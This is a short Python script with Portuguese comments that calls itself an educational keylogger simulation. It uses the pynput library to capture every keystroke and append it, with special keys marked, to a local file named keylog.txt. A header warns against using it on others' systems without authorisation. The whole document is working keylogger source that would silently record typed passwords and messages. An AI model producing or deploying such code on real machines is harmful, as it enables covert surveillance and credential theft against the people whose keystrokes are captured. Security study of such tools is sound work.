# Projeto educacional de Cibersegurança
# Simulação de Keylogger em ambiente controlado
# ⚠️ Uso apenas para fins de estudo. Não utilizar em sistemas de terceiros sem autorização.

from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.shift_l,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt,
    keyboard.Key.alt_r,
    keyboard.Key.alt_l,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
    keyboard.Key.cmd_l,
    keyboard.Key.caps_lock,
}


def on_press(key):
    try:
        # se for uma tecla "normal" (letra, número, símbolo)
        #if key in IGNORAR:
        #    return
        with open("keylog.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    
    except AttributeError:
        # se for uma tecla especial (shift, ctrl, alt, etc)
        with open("keylog.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")               
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()